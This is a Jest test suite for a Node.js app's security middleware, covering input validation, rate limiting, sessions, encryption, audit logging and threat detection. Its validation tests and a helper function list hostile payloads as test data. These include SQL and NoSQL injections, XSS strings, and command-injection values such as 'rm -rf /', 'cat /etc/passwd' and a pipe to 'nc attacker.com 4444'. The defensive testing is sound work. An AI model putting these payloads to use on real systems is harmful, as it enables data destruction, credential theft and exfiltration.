const InputValidator = require("../src/middleware/inputValidator");
const RateLimiter = require("../src/middleware/rateLimiter");
const SecurityManager = require("../src/middleware/securityManager");
const ErrorHandler = require("../src/middleware/errorHandler");
const { getSecurityConfig } = require("../src/config/securityConfig");

describe("Security Test Suite", () => {
  let inputValidator;
  let rateLimiter;
  let securityManager;
  let errorHandler;
  let securityConfig;

  beforeEach(() => {
    inputValidator = new InputValidator();
    rateLimiter = new RateLimiter();
    securityManager = new SecurityManager();
    errorHandler = new ErrorHandler();
    securityConfig = getSecurityConfig();
  });

  describe("Input Validation Security", () => {
    test("should detect SQL injection attempts", () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'/*",
        "' UNION SELECT password FROM users--",
        "'; INSERT INTO users VALUES('hacker','pass'); --",
      ];

      maliciousInputs.forEach((input) => {
        const result = inputValidator.validateInput(input, "message");
        expect(result.isValid).toBe(false);
        expect(result.error).toContain("forbidden patterns");
      });
    });

    test("should detect NoSQL injection attempts", () => {
      const noSqlInjections = [
        '{"$ne": null}',
        '{"$where": "this.username == this.password"}',
        '{"$regex": ".*"}',
        '{"$gt": ""}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
      ];

      noSqlInjections.forEach((input) => {
        const result = inputValidator.validateInput(input, "message");
        expect(result.isValid).toBe(false);
      });
    });

    test("should detect XSS attempts", () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
      ];

      xssPayloads.forEach((payload) => {
        const result = inputValidator.validateInput(payload, "message");
        expect(result.sanitized).not.toContain("<script>");
        expect(result.sanitized).not.toContain("javascript:");
      });
    });

    test("should detect command injection attempts", () => {
      const commandInjections = [
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 4444",
        "test `whoami`",
        "test $(cat /etc/passwd)",
      ];

      commandInjections.forEach((input) => {
        const result = inputValidator.validateInput(input, "message");
        expect(result.isValid).toBe(false);
      });
    });

    test("should validate input length limits", () => {
      const longInput = "A".repeat(2000);
      const result = inputValidator.validateInput(longInput, "message");

      expect(result.isValid).toBe(false);
      expect(result.error).toContain("too long");
    });

    test("should sanitize unicode and special characters", () => {
      const unicodeInput = "test\u0000\u200B\uFEFF";
      const result = inputValidator.validateInput(unicodeInput, "message");

      expect(result.sanitized).not.toContain("\u0000");
      expect(result.sanitized).not.toContain("\u200B");
      expect(result.sanitized).not.toContain("\uFEFF");
    });

    test("should validate phone number format", () => {
      const validPhone = "1234567890";
      const invalidPhone = "not-a-phone";

      expect(
        inputValidator.validateInput(validPhone, "phoneNumber").isValid
      ).toBe(true);
      expect(
        inputValidator.validateInput(invalidPhone, "phoneNumber").isValid
      ).toBe(false);
    });

    test("should validate email format", () => {
      const validEmails = ["test@example.com", "user.name@domain.co.uk"];
      const invalidEmails = ["invalid-email", "@domain.com", "test@"];

      validEmails.forEach((email) => {
        expect(inputValidator.validateInput(email, "email").isValid).toBe(true);
      });

      invalidEmails.forEach((email) => {
        expect(inputValidator.validateInput(email, "email").isValid).toBe(
          false
        );
      });
    });
  });

  describe("Rate Limiting Security", () => {
    test("should enforce rate limits", () => {
      const userId = "test-user";

      // first requests should pass
      for (let i = 0; i < 10; i++) {
        expect(rateLimiter.isRateLimited(userId, "commands")).toBe(false);
      }

      // 11th request should be rate limited
      expect(rateLimiter.isRateLimited(userId, "commands")).toBe(true);
    });

    test("should detect suspicious activity patterns", () => {
      const userId = "suspicious-user";

      // trigger multiple rate limits
      for (let i = 0; i < 25; i++) {
        rateLimiter.isRateLimited(userId, "commands");
        rateLimiter.isRateLimited(userId, "messages");
      }

      const suspiciousActivity = rateLimiter.detectSuspiciousActivity(userId);
      expect(suspiciousActivity.isSuspicious).toBe(true);
      expect(suspiciousActivity.severity).toBe("high");
    });

    test("should reset rate limits after time window", (done) => {
      const userId = "reset-test-user";

      // trigger rate limit
      for (let i = 0; i <= 10; i++) {
        rateLimiter.isRateLimited(userId, "commands");
      }

      expect(rateLimiter.isRateLimited(userId, "commands")).toBe(true);

      // wait for reset (using shorter window for testing)
      setTimeout(() => {
        expect(
          rateLimiter.getRemainingRequests(userId, "commands")
        ).toBeGreaterThan(0);
        done();
      }, 100);
    }, 1000);

    test("should handle concurrent rate limit checks", () => {
      const userId = "concurrent-user";
      const promises = [];

      // simulate concurrent requests
      for (let i = 0; i < 20; i++) {
        promises.push(
          Promise.resolve(rateLimiter.isRateLimited(userId, "commands"))
        );
      }

      return Promise.all(promises).then((results) => {
        const rateLimitedCount = results.filter((r) => r === true).length;
        expect(rateLimitedCount).toBeGreaterThan(0);
      });
    });
  });

  describe("Session Security", () => {
    test("should create secure sessions", () => {
      const userId = "test-user";
      const sessionId = securityManager.createSession(userId);

      expect(sessionId).toBeDefined();

      // uuid format
      expect(sessionId).toMatch(/^[0-9a-f-]{36}$/);
    });

    test("should validate sessions correctly", () => {
      const userId = "session-user";
      const sessionId = securityManager.createSession(userId);

      const validation = securityManager.validateSession(sessionId, userId);
      expect(validation.isValid).toBe(true);
      expect(validation.session.userId).toBe(userId);
    });

    test("should detect session hijacking attempts", () => {
      const originalUser = "original-user";
      const attackerUser = "attacker-user";

      const sessionId = securityManager.createSession(originalUser);

      // attacker tries to use original user session
      const validation = securityManager.validateSession(
        sessionId,
        attackerUser
      );
      expect(validation.isValid).toBe(false);
      expect(validation.reason).toBe("Session mismatch");
    });

    test("should expire old sessions", () => {
      const userId = "expiry-user";
      const sessionId = securityManager.createSession(userId);

      // manually expire session
      securityManager.expireSession(sessionId, "test");

      const validation = securityManager.validateSession(sessionId, userId);
      expect(validation.isValid).toBe(false);
    });

    test("should prevent session fixation attacks", () => {
      const userId = "fixation-user";
      const sessionId1 = securityManager.createSession(userId);
      const sessionId2 = securityManager.createSession(userId);

      // sessions should be different
      expect(sessionId1).not.toBe(sessionId2);
    });
  });

  describe("User Blocking Security", () => {
    test("should block users for security violations", () => {
      const userId = "violator-user";

      securityManager.blockUser(userId, "Security violation");

      const blockStatus = securityManager.isUserBlocked(userId);
      expect(blockStatus.isBlocked).toBe(true);
      expect(blockStatus.reason).toBe("Security violation");
    });

    test("should implement escalating block durations", () => {
      const userId = "repeat-violator";

      // first block
      securityManager.blockUser(userId, "First violation", 1000);
      securityManager.unblockUser(userId);

      // second block should be longer
      securityManager.blockUser(userId, "Second violation", 1000);
      const blockInfo = securityManager.blockedUsers.get(userId);
      expect(blockInfo.blockCount).toBe(2);
    });

    test("should unblock users after timeout", (done) => {
      const userId = "timeout-user";

      securityManager.blockUser(userId, "Temporary block", 50);

      setTimeout(() => {
        const blockStatus = securityManager.isUserBlocked(userId);
        expect(blockStatus.isBlocked).toBe(false);
        done();
      }, 100);
    }, 1000);
  });

  describe("Encryption Security", () => {
    test("should encrypt and decrypt data correctly", () => {
      const originalData = { secret: "sensitive information", userId: "12345" };

      const encrypted = securityManager.encrypt(originalData);
      expect(encrypted.encrypted).toBeDefined();
      expect(encrypted.iv).toBeDefined();

      const decrypted = securityManager.decrypt(encrypted);
      expect(decrypted).toEqual(originalData);
    });

    test("should use different IVs for each encryption", () => {
      const data = { test: "data" };

      const encrypted1 = securityManager.encrypt(data);
      const encrypted2 = securityManager.encrypt(data);

      expect(encrypted1.iv).not.toBe(encrypted2.iv);
      expect(encrypted1.encrypted).not.toBe(encrypted2.encrypted);
    });

    test("should fail decryption with wrong data", () => {
      const fakeEncrypted = {
        encrypted: "fake-data",
        iv: "fake-iv",
      };

      expect(() => {
        securityManager.decrypt(fakeEncrypted);
      }).toThrow();
    });
  });

  describe("Error Handling Security", () => {
    test("should handle errors without exposing sensitive information", async () => {
      const sensitiveError = new Error("Database password: secret123");
      sensitiveError.stack = "Sensitive stack trace with credentials";

      const result = await errorHandler.handleError(sensitiveError, {
        operation: "test",
      });

      const userMessage = errorHandler.getUserFriendlyMessage(result.errorInfo);
      expect(userMessage).not.toContain("secret123");
      expect(userMessage).not.toContain("password");
    });

    test("should implement circuit breaker pattern", async () => {
      const category = "TEST_CATEGORY";

      // trigger multiple failures to open circuit
      for (let i = 0; i < 10; i++) {
        await errorHandler.handleError(new Error("Test error"), {
          operation: "test",
        });
        errorHandler.updateCircuitBreaker(category, true);
      }

      const circuitState = errorHandler.checkCircuitBreaker(category);
      expect(circuitState.isOpen).toBe(true);
    });

    test("should categorize errors correctly", () => {
      const networkError = new Error("ECONNREFUSED");
      const dbError = new Error("MongoError: connection failed");
      const validationError = new Error("ValidationError: invalid input");

      const networkResult = errorHandler.analyzeError(networkError);
      const dbResult = errorHandler.analyzeError(dbError);
      const validationResult = errorHandler.analyzeError(validationError);

      expect(networkResult.category).toBe("NETWORK");
      expect(dbResult.category).toBe("DATABASE");
      // validation error is DB category
      expect(validationResult.category).toBe("DATABASE");
    });
  });

  describe("Security Configuration", () => {
    test("should load security configuration correctly", () => {
      expect(securityConfig.config).toBeDefined();
      expect(securityConfig.config.rateLimiting).toBeDefined();
      expect(securityConfig.config.inputValidation).toBeDefined();
      expect(securityConfig.config.session).toBeDefined();
    });

    test("should validate required security settings", () => {
      expect(() => {
        new SecurityConfig();
      }).not.toThrow();
    });

    test("should calculate security level correctly", () => {
      const securityLevel = securityConfig.getSecurityLevel();
      expect(securityLevel).toBeGreaterThan(0);
      expect(securityLevel).toBeLessThanOrEqual(100);
    });

    test("should get configuration values correctly", () => {
      const rateLimitConfig = securityConfig.get(
        "rateLimiting.maxRequests.commands"
      );
      expect(rateLimitConfig).toBeDefined();
      expect(typeof rateLimitConfig).toBe("number");
    });
  });

  describe("Audit Logging Security", () => {
    test("should log security events", () => {
      const userId = "audit-user";
      const eventsBefore = securityManager.auditLog.length;

      securityManager.logSecurityEvent(userId, "TEST_EVENT", { test: "data" });

      expect(securityManager.auditLog.length).toBe(eventsBefore + 1);

      const lastEvent =
        securityManager.auditLog[securityManager.auditLog.length - 1];
      expect(lastEvent.userId).toBe(userId);
      expect(lastEvent.action).toBe("TEST_EVENT");
    });

    test("should sanitize sensitive data in logs", () => {
      const userId = "log-user";
      const sensitiveData = {
        password: "secret123",
        apiKey: "key-123",
        normalData: "safe",
      };

      securityManager.logSecurityEvent(
        userId,
        "SENSITIVE_EVENT",
        sensitiveData
      );

      const lastEvent =
        securityManager.auditLog[securityManager.auditLog.length - 1];
      expect(lastEvent.details.password).not.toBe("secret123");
      expect(lastEvent.details.normalData).toBe("safe");
    });

    test("should maintain audit log size limits", () => {
      const originalMaxSize = securityManager.maxAuditLogSize;
      // small limit for testing
      securityManager.maxAuditLogSize = 5;

      // add more events than the limit
      for (let i = 0; i < 10; i++) {
        securityManager.logSecurityEvent("test", `EVENT_${i}`, {});
      }

      expect(securityManager.auditLog.length).toBeLessThanOrEqual(5);

      // restore original limit
      securityManager.maxAuditLogSize = originalMaxSize;
    });
  });

  describe("Threat Detection", () => {
    test("should detect threat patterns", () => {
      const userId = "threat-user";

      // simulate suspicious activity
      securityManager.logSecurityEvent(userId, "RATE_LIMIT_EXCEEDED", {});
      securityManager.logSecurityEvent(userId, "INVALID_SESSION_ACCESS", {});
      securityManager.logSecurityEvent(userId, "MALICIOUS_INPUT_DETECTED", {});

      const threats = securityManager.analyzeSecurityThreats(
        userId,
        "TEST_ACTION"
      );
      expect(threats.length).toBeGreaterThan(0);
    });

    test("should generate security reports", () => {
      const report = securityManager.generateSecurityReport();

      expect(report).toBeDefined();
      expect(report.activeSessions).toBeDefined();
      expect(report.blockedUsers).toBeDefined();
      expect(report.securityMetrics).toBeDefined();
    });

    test("should calculate overall threat level", () => {
      const threatLevel = securityManager.calculateOverallThreatLevel();

      expect(threatLevel).toBeGreaterThanOrEqual(1);
      expect(threatLevel).toBeLessThanOrEqual(4);
    });
  });

  describe("Integration Security Tests", () => {
    test("should handle complete attack scenario", async () => {
      const attackerId = "attacker";

      // if attacker tries SQL injection
      const sqlResult = inputValidator.validateInput(
        "'; DROP TABLE users; --",
        "message"
      );
      expect(sqlResult.isValid).toBe(false);

      // if security manager logs the attempt
      securityManager.logSecurityEvent(attackerId, "MALICIOUS_INPUT_DETECTED", {
        input: sqlResult.sanitized,
      });

      // if rate limiter blocks excessive requests
      for (let i = 0; i < 15; i++) {
        rateLimiter.isRateLimited(attackerId, "commands");
      }
      expect(rateLimiter.isRateLimited(attackerId, "commands")).toBe(true);

      // if security manager blocks the user
      securityManager.blockUser(attackerId, "Multiple security violations");
      expect(securityManager.isUserBlocked(attackerId).isBlocked).toBe(true);

      // if threat analysis shows high risk
      const threats = securityManager.analyzeSecurityThreats(
        attackerId,
        "ATTACK"
      );
      expect(threats.some((t) => t.severity >= 3)).toBe(true);
    });

    test("should handle legitimate user workflow", () => {
      const legimitateUserId = "good-user";

      // if valid input passes validation
      const validResult = inputValidator.validateInput(
        "Hello, how are you?",
        "message"
      );
      expect(validResult.isValid).toBe(true);

      // if rate limiting allows normal usage
      expect(rateLimiter.isRateLimited(legimitateUserId, "messages")).toBe(
        false
      );

      // if session management works normally
      const sessionId = securityManager.createSession(legimitateUserId);
      const sessionValidation = securityManager.validateSession(
        sessionId,
        legimitateUserId
      );
      expect(sessionValidation.isValid).toBe(true);

      // if user is not blocked
      expect(securityManager.isUserBlocked(legimitateUserId).isBlocked).toBe(
        false
      );
    });
  });
});

// helper function to generate test data
function generateTestPayloads() {
  return {
    sqlInjection: [
      "1'; DROP TABLE users; --",
      "admin'--",
      "' OR 1=1 --",
      "'; INSERT INTO users VALUES('hacker','pass'); --",
    ],
    xss: [
      "<script>alert('XSS')</script>",
      "<img src='x' onerror='alert(1)'>",
      "javascript:alert('XSS')",
      "<svg onload='alert(1)'>",
    ],
    commandInjection: [
      "test; rm -rf /",
      "test && cat /etc/passwd",
      "test | nc attacker.com 4444",
      "test `id`",
    ],
  };
}

module.exports = {
  generateTestPayloads,
};
